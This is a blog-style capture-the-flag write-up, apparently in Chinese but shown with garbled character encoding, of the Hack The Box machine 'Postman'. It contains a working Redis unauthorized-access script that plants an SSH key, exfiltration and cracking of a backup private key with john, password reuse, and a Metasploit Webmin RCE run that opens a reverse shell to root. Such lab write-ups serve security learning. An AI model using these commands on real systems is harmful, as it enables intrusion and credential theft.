I"ĞB<h2 id="0x00-ç®€ä»‹">0x00 ç®€ä»‹</h2>

<ul>
  <li>nmap æŒ‡ä»¤</li>
  <li>Redis æœªæˆæƒè®¿é—®</li>
  <li>Webmin CVE Package Updates</li>
</ul>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†">0x01 ä¿¡æ¯æ”¶é›†</h2>

<p>nmap å¯¹æŸä¸€ç«™ç‚¹å…¨é¢æ‰«æ (<strong>SYNå…¨ç«¯å£æ‰«æ</strong>) å¸¸ç”¨æŒ‡ä»¤å¦‚ä¸‹ï¼š</p>

<pre><code class="language-shell">nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
</code></pre>

<blockquote>
  <p><strong>-sS:</strong>  SYNæ‰«ææ˜¯ç›®å‰é»˜è®¤çš„ä¹Ÿæ˜¯æœ€å—æ¬¢è¿çš„æ‰«æé€‰é¡¹</p>

  <p><strong>-sV:</strong> ç‰ˆæœ¬æ¢æµ‹ï¼Œä¹Ÿå¯ä»¥ç”¨ -A åŒæ—¶æ‰“å¼€æ“ä½œç³»ç»Ÿæ¢æµ‹å’Œç‰ˆæœ¬æ¢æµ‹ã€‚</p>

  <p><strong>-sC:</strong> ä½¿ç”¨é»˜è®¤è„šæœ¬è¿›è¡Œæ‰«æ</p>

  <p><strong>-T4:</strong> æŒ‡å®šæ‰«æè¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ—¶åº(Timing)ï¼Œå…±æœ‰6ä¸ªçº§åˆ«(0-5)ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œä½†ä¹Ÿè¶Šå®¹æ˜“è¢«é˜²ç«å¢™å±è”½ã€‚åœ¨ç½‘ç»œé€šä¿¡çŠ¶æ€è‰¯å¥½çš„æƒ…å†µä¸‹æ¨èä½¿ç”¨ T4.</p>

  <p><strong>-v:</strong> æ˜¾ç¤ºå†—ä½™ä¿¡æ¯ï¼Œåœ¨æ‰«æè¿‡ç¨‹ä¸­æ˜¾ç¤ºæ‰«æçš„ç»†èŠ‚</p>

  <p><strong>-p-:</strong> è¡¨ç¤ºä»ç«¯å£1æ‰«æåˆ°65535</p>

  <p><strong>Other:</strong> æ‰«æçš„æ—¶å€™æŒ‰ <code>d</code> å¯ä»¥æ˜¾ç¤º debug ä¿¡æ¯ï¼ŒæŒ‰ <code>x</code> å¯ä»¥æ˜¾ç¤ºå½“å‰è¿›åº¦</p>
</blockquote>

<pre><code class="language-shell">root@kali:~# nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 21:56 CST
Nmap scan report for Postman (10.10.10.160)
Host is up (0.15s latency).
Not shown: 49025 closed ports, 16506 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds
</code></pre>

<p>å‘ç°å¼€æ”¾äº†4ä¸ªç«¯å£ï¼Œ 80 ç«¯å£åœ¨æŸ¥çœ‹é¡µé¢å’Œæ‰«æç›®å½•åæœªå‘ç°ç‰¹åˆ«æ˜æ˜¾çš„æ¼æ´ï¼Œå…ˆç»§ç»­çœ‹çœ‹åé¢ä¸¤ä¸ªç«¯å£ã€‚</p>

<h2 id="0x02-redis-æœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨">0x02 Redis æœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</h2>

<p>å‘ç° 6379 ç«¯å£è¿è¡Œç€ Redis æœåŠ¡ï¼Œä¸”ç‰ˆæœ¬è¾ƒä½ï¼Œå­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¯ä»¥å°†æœ¬åœ° ssh å…¬é’¥å†™è¿›è¿œç¨‹é¶æœºä»è€Œ  getshell</p>

<p>exploit å¦‚ä¸‹ï¼š</p>

<pre><code class="language-shll">#!/bin/bash
rm /root/.ssh/id*
ssh-keygen -t rsa

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") &gt; foo.txt

redis-cli -h 10.10.10.160 flushall
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
redis-cli -h 10.10.10.160 save

ssh -i /root/.ssh/id_rsa redis@10.10.10.160
</code></pre>

<p>å…·ä½“è¯´æ˜ï¼š</p>

<ol>
  <li>
    <p>å°†æœ¬åœ° kali çš„ ssh å…¬é’¥å†™è¿›æ–‡æœ¬ foo ä¸­ï¼Œåœ¨å…¶å‰åæ·»åŠ æ¢è¡Œç¬¦ <code>\n</code> ä¸ºäº†é¿å…å’ŒRedisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆ</p>
  </li>
  <li>
    <p>redis-cli <code>-x</code> å‚æ•°ï¼šä»£è¡¨ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä½œä¸ºè¯¥å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚</p>

    <p>ä¾‹ï¼š<code>$echo "world" |redis-cli -x set hello</code> ç­‰ä»·äº <code>redis-cli set hello world</code></p>
  </li>
  <li>
    <p>è¯¥ç‰ˆæœ¬çš„ Redis å…è®¸ä»»æ„ç”¨æˆ·æœªæˆæƒè®¿é—®å¹¶å†™æ–‡ä»¶ï¼ŒåŒæ—¶ Redis åœ¨å…¶é»˜è®¤ç›®å½•ä¸‹æ‹¥æœ‰ ssh å¯†é’¥å¹¶å¯¹å…¶æœ‰å†™æƒé™ã€‚è¿™å¯¼è‡´æ”»å‡»è€…å¯ä»¥ç”¨è‡ªå·±çš„å…¬é’¥è¦†ç›–åŸæ–‡ä»¶ï¼Œå®ç°è¿œç¨‹ç™»å½•ã€‚</p>
  </li>
  <li>
    <p>è¿™é‡Œè®¾å®šäº† crackit çš„é”®å€¼ä¸ºå…¬é’¥ï¼Œå¹¶é€šè¿‡ redis å‘½ä»¤å˜æ›´ Redis DB æ–‡ä»¶åŠå­˜æ”¾åœ°ç‚¹ä¸ºç”¨æˆ·çš„ <code>.ssh</code> æ–‡ä»¶å¤¹ï¼Œå¹¶å°† <code>authorized_keys</code> è¦†ç›–</p>

    <p>è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„å°†è‡ªå·±çš„å…¬é’¥å†™å…¥ /.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶é‡Œï¼Œç„¶åæ”»å‡»è€…å°±å¯ä»¥ç›´æ¥ç”¨ ssh å…å¯†ç™»å½•</p>
  </li>
  <li>
    <p>å› ä¸ºé¶æœºä¸€ç›´è¢«æ‰€æœ‰äººé¢‘ç¹ä¿®æ”¹å’Œå¤å†™ï¼Œä¸€å¼€å§‹è¿æ¥æ—¶éœ€è¦ä½¿ç”¨ <code>flushall</code> åˆ é™¤æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰key</p>

    <blockquote>
      <p><a href="https://www.00theway.org/2017/03/27/redis_exp/">redisæœªæˆæƒè®¿é—®åˆ©ç”¨</a></p>

      <p><a href="https://damit5.com/2018/05/18/Redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨/#å†™å…¥SSHå…¬é’¥ç›´æ¥è¿æ¥">Redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</a></p>
    </blockquote>
  </li>
</ol>

<p><strong>æ³¨æ„ï¼š</strong></p>

<p>åœ¨è¯•å›¾ <code>set key</code> æ—¶ï¼Œå¯èƒ½ä¼šçˆ†å‡ºé”™è¯¯ <code>(error) READONLY You can't write against a read only slave.</code></p>

<p>ä¸»è¦æ˜¯å› ä¸ºæ‰€æœ‰äººéƒ½åœ¨å°è¯•æ”»ç ´é¶æœºï¼Œå¯èƒ½è¾“å…¥æŸäº›å¥‡æ€ªçš„å‘½ä»¤ä½¿ redis å˜æˆäº†ä»æœåŠ¡å™¨ï¼Œå¯¼è‡´æ— æ³•å†™å…¥ï¼Œéœ€è¦ä½¿ç”¨ <code>SLAVEOF no one</code> ä½¿å…¶å˜å›ä¸»æœåŠ¡å™¨ã€‚</p>

<p><a href="https://xz.aliyun.com/t/5616#toc-3">SLAVEOF</a></p>

<p><a href="https://juejin.im/post/58d4e31aa22b9d00645634fc">Redis ä¸»ä»å¤åˆ¶å¸¸è§é—®é¢˜</a></p>

<pre><code>10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
(error) READONLY You can't write against a read only slave.
10.10.10.160:6379&gt; SLAVEOF no one
OK
10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
OK
(0.95s)
</code></pre>

<h2 id="0x03-usertxt">0x03 User.txt</h2>

<p>æ‹¿åˆ° redis çš„ä½æƒé™ shell åï¼Œåœ¨ <code>/home</code> ç›®å½•ä¸‹å‘ç°ç”¨æˆ· Mattï¼Œ<code>su Mutt</code> å°è¯•åˆ‡æ¢å‘ç°éœ€è¦å¯†ç ã€‚åœ¨ <code>.bash_history</code> æ–‡ä»¶ä¸­å‘ç°å­˜åœ¨ <code>id_rsa_bak</code>ï¼Œå› æ­¤éå†å„ä¸ªå…³é”®ç›®å½•æŸ¥æ‰¾çº¿ç´¢ï¼Œåœ¨ <code>/var/opt</code> ä¸‹å‘ç° <code>ida_rsa.bak</code> æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ Matt çš„ ssh ç§é’¥ï¼Œä¸‹é¢å¼€å§‹çˆ†ç ´ã€‚</p>

<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gam2ib83kzj316g0u048k.jpg" alt="Xnip2020-01-05_22-44-39" /></p>

<p>é€šè¿‡ <code>base64</code> å’Œ <code>base64 -d</code> å°†æ–‡ä»¶æ‹·è´åˆ°æœ¬åœ° kaliï¼Œå‘½åä¸º Mattssh_bak</p>

<pre><code class="language-shell">redis@Postman:/var$ cd /opt
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ base64 id_rsa.bak 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
Sm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdH
c1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNq
cDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGly
cVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlN
R1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZ
dXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgz
d2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpC
VUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3Qw
Vko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1p
OEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVds
cGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5Kcjcv
TWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0
S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpL
ZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdw
M0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4
VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZm
M21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6
VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRK
M3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dW
cExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0Jj
eU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3
TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRS
VDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJK
MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1
a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
</code></pre>

<pre><code class="language-shell">root@kali:~/Desktop/ echo -n "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d &gt; Mattssh_bak 

</code></pre>

<p>å’Œä¸Šä¸€ç¯‡åšå®¢ä¸€æ ·ï¼Œä¹‹ååœ¨æœ¬æœºä½¿ç”¨ ssh2john å°†å¯†é’¥è½¬æ¢ä¸ºå¯ç ´è§£çš„å“ˆå¸Œæ ¼å¼ï¼Œå†ä½¿ç”¨ john çš„è‡ªå¸¦å­—å…¸è¿›è¡Œ passphrase çš„çˆ†ç ´</p>

<pre><code class="language-shell">root@kali:~/home# ssh2john Mattssh_bak &gt; matthash
root@kali:~/home# john --wordlist=/usr/share/wordlists/rockyou.txt matthash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (Matts.key)
1g 0:00:00:01 10.16% (ETA: 04:52:13) 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
Session aborted
</code></pre>

<p>å¾—åˆ° ssh çš„å¯†é’¥ <code>computer2008</code>ï¼Œä½†ç›´æ¥ä½¿ç”¨ ssh æ— æ³•æˆåŠŸç™»å½•ï¼Œæ¯•ç«Ÿè¿™æ˜¯å¤‡ä»½å¯†é’¥ï¼Œå¯èƒ½å·²ç»æ— æ³•ä½¿ç”¨ã€‚ä½† <code>computer2008</code> ä½œä¸º Matt çš„ä¸€ä¸ªå¯†ç å¯èƒ½ä¼šè¢«é‡ç”¨åœ¨åˆ«çš„åœ°æ–¹ã€‚å…ˆç™»å½• redis ç”¨æˆ·ï¼Œå†åˆ‡æ¢ç”¨æˆ·ï¼Œå°è¯•å°†å¯†ç è¾“å…¥ï¼Œbingo!</p>

<pre><code class="language-shell">redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ whoami
Matt
Matt@Postman:/var/lib/redis$ cd
Matt@Postman:~$ ls
user.txt
</code></pre>

<h2 id="0x04-roottxt">0x04 Root.txt</h2>

<p>æƒ³èµ·ä¹‹å‰ 10000 ç«¯å£çš„ Webmin æœåŠ¡ï¼Œæç¤ºç½‘ç«™ä½¿ç”¨ SSLï¼Œå°†ç½‘å€çš„ http æ¢æˆ https å³å¯ã€‚</p>

<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fmt3f1j31c00u0jzi.jpg" alt="Xnip2020-01-05_21-25-59" /></p>

<p>ä½¿ç”¨ Matt å’Œ computer2008 å°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸï¼Œç½‘ç«™æœ¬èº«æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œå†æ¬¡æ³¨æ„åˆ° Webmin çš„ç‰ˆæœ¬ï¼Œæœç´¢æ˜¯å¦å­˜åœ¨ç›¸å…³ exploitã€‚</p>

<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fxzn4yj31c00u0n54.jpg" alt="Xnip2020-01-05_21-26-19" /></p>

<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gam0gatz9fj31c00u0aon.jpg" alt="Xnip2020-01-05_21-29-21" /></p>

<p>å‘ç° msf å·²ç»é›†æˆäº†é’ˆå¯¹è¯¥ç‰ˆæœ¬å¯åˆ©ç”¨çš„ exploit</p>

<pre><code class="language-shell">msf5 &gt; search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


msf5 &gt; use exploit/linux/http/webmin_packageup_rce

msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.44      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin &lt;= 1.910

</code></pre>

<p>è®¾ç½®å¥½é€‰é¡¹ï¼Œæ³¨æ„ SSL é€‰é¡¹éœ€è¦è®¾ç½®ä¸º true</p>

<pre><code class="language-shell">msf5 exploit(linux/http/webmin_packageup_rce) &gt; run

[*] Started reverse TCP handler on 10.10.14.165:9004 
[+] Session cookie: 8269def18359f1629182b2d26b9f86ed
[*] Attempting to execute the payload...
[*] Command shell session 2 opened (10.10.14.165:9004 -&gt; 10.10.10.160:41404) at 2019-11-28 05:12:27 -0500

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
ls
root.txt
</code></pre>

<h2 id="0x05-thanks">0x05 Thanksï¼</h2>

<p>ä¹Ÿç®—æ˜¯è‡ªå·±è¾¹å­¦è¾¹è®°å½•ï¼Œæœ›å¤§ä½¬æ‰‹ä¸‹ç•™æƒ…~</p>

:ET